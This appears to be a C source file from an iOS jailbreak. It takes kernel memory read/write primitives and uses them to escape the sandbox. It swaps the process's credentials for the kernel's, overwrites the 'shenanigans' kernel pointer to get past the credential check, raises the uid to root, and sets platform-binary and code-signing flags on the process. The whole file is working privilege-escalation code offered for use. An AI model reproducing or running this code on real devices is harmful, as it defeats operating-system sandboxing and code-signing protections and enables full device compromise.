//
//  shenanigans.c


#include "shenanigans.h"
#include "common.h"
#include "utils.h"
#include "remap_tfp_set_hsp.h"
#include "PFOffs.h"
#include "KernelUtils.h"
#include "kernel_memory.h"
#include "kernel_memorySP.h"

#include "offsetss3.h"
#include "parameters.h"
#include <stdint.h>
#include <mach/mach_init.h>

//We should only use this for v_swap

bool set_platform_binary(kptr_t proc, bool set)
{
    bool ret = false;
    kptr_t const task_struct_addr = ReadKernel64(proc + koffsetS3(KSTRUCT_OFFSET_PROC_TASK));
    kptr_t const task_t_flags_addr = task_struct_addr + koffsetS3(KSTRUCT_OFFSET_TASK_TFLAGS);
    uint32_t task_t_flags = ReadKernel32(task_t_flags_addr);
    if (set) {
        task_t_flags |= 0x00000400;
    } else {
        task_t_flags &= ~(0x00000400);
    }
    WriteKernel32(task_struct_addr + koffsetS3(KSTRUCT_OFFSET_TASK_TFLAGS), task_t_flags);
    ret = true;
out:;
    return ret;
}

uint64_t give_creds_to_process_at_addr(uint64_t proc, uint64_t cred_addr)
{
    uint64_t orig_creds = ucreds_oob;//ReadKernel64(proc + koffsetS3(KSTRUCT_OFFSET_PROC_UCRED));
    LOG("orig_creds = " ADDR, orig_creds);
    if (!ISADDR(orig_creds)) {
        LOG("failed to get orig_creds!");
        return 0;
    }
    WriteKernel64(proc + OFFSET(proc, p_ucred), cred_addr);
    return orig_creds;
}

kptr_t get_kernel_proc_struct_addr() {
    kptr_t ret = KPTR_NULL;
    kptr_t const symbol = GETOFFSET(kernel_task);
    printf("symbol = 0x%llx\n", symbol);
    kptr_t const task = kerntaskFinal__OOB;//ReadKernel64(symbol);
    printf("task = 0x%llx\n", task);
    kptr_t const bsd_info = ReadKernel64(task + OFFSET(task, bsd_info));
    printf("bsd_info = 0x%llx\n", bsd_info);
    ret = bsd_info;
out:;
    return ret;
}

kptr_t get_kernel_cred_addr()
{
    kptr_t ret = KPTR_NULL;
    kptr_t const kernel_proc_struct_addr = get_kernel_proc_struct_addr();
    printf("kernel_proc_struct_addr = 0x%llx\n", kernel_proc_struct_addr);
    kptr_t const kernel_ucred_struct_addr = ReadKernel64(kernel_proc_struct_addr + OFFSET(proc, p_ucred));
    printf("kernel_ucred_struct_addr = 0x%llx\n", kernel_ucred_struct_addr);
    ret = kernel_ucred_struct_addr;
out:;
    return ret;
}

bool set_csflags_fr(kptr_t proc, uint32_t flags, bool value) {
    bool ret = false;
    kptr_t const proc_csflags_addr = proc + koffsetS3(KSTRUCT_OFFSET_PROC_P_CSFLAGS);
    uint32_t csflags = ReadKernel32(proc_csflags_addr);
    if (value == true) {
        csflags |= flags;
    } else {
        csflags &= ~flags;
    }
    WriteKernel32(proc_csflags_addr, csflags);
    ret = true;
out:;
    return ret;
}

bool set_cs_platform_binary(kptr_t proc, bool value) {
    bool ret = false;
    set_csflags_fr(proc, 0x4000000, value);
    ret = true;
out:;
    return ret;
}


void runShenPatch()
{
    static uint64_t ShenanigansPatch = 0xca13feba37be;
    
    uint64_t proc;
    uint64_t kernelCredAddr;
    uint64_t myCredAddr;
    uint64_t Shenanigans;
    host_t myHost;
    
    LOG("Escaping Sandbox...");
    
    proc = get_proc_struct_for_pid1(getpid());
    kernelCredAddr = get_kernel_cred_addr();
    Shenanigans = ReadKernel64(GETOFFSET(shenanigans));
    if (Shenanigans != kernelCredAddr) {
        LOG("Detected corrupted shenanigans pointer.");
        Shenanigans = kernelCredAddr;
    }
    WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
    uint64_t myOriginalCredAddr = myCredAddr = give_creds_to_process_at_addr(proc, kernelCredAddr);
    LOG("myOriginalCredAddr = " ADDR, myOriginalCredAddr);
    
    setUID(getuid(), proc);
    //setuid(0);
    printf("setuid: %d, uid: %d\n", setuid(0), getuid());
    if (getuid() != 0)
    {
        printf("failed to de-elevate to uid: %d\n", getuid());
        //elevateRet = KERN_FAILURE;
        //goto out;
    }
    
    if (getuid() != 0)
    {
        LOG("ERROR SETTING UID");
        exit(-1);
    }
    
    myHost = mach_host_self();
    set_platform_binary(proc, true);
    set_cs_platform_binary(proc, true);
    LOG("Successfully escaped Sandbox.");
}
